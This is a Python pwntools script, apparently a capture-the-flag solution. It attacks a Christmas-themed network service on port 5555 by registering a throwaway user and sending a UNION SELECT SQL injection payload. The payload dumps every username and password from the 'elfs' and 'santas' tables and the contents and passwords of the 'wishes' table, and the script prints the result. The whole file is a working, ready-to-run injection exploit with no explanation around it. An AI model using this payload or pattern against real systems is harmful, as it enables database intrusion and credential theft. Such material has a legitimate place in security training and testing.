#!/usr/bin/env python3

import sys
import random
from string import ascii_letters
from pwn import *


def random_string():
    return ''.join(random.choice(ascii_letters) for _ in range(32))


host = sys.argv[1] if len(sys.argv) > 1 else 'localhost'

payload = """non-existing-id'
UNION SELECT
(SELECT id FROM elfs LIMIT 1),
(CONCAT(
    (SELECT string_agg(username, ',') FROM elfs),
    (SELECT string_agg(password, ',') FROM elfs),
    (SELECT string_agg(username, ',') FROM santas),
    (SELECT string_agg(password, ',') FROM santas),
    (SELECT string_agg(content, ',') FROM wishes),
    (SELECT string_agg(password, ',') FROM wishes)
)),
('dummypasswd')
; -- 
""".replace('\n', '')

santa = random_string()
r = remote(host, 5555)
r.recvuntil(b'*> ')
r.sendline(b'2')
r.recvuntil(b': ')
r.sendline(santa.encode())
r.recvuntil(b': ')
r.sendline(santa.encode())

r.recvuntil(b'*> ')
r.sendline(b'5')
r.recvuntil(b': ')
r.sendline(santa.encode())
r.recvuntil(b': ')
r.sendline(santa.encode())
r.recvuntil(b': ')
r.sendline(payload.encode())
response = r.recvuntil((b'(y/n) > ', b'\n\n')).decode()
r.sendline(b'y')
r.recvuntil(b': ')
r.sendline('dummypasswd'.encode())
response = r.recvuntil(b'\n\n').decode()
print(response, flush=True)

r.close()
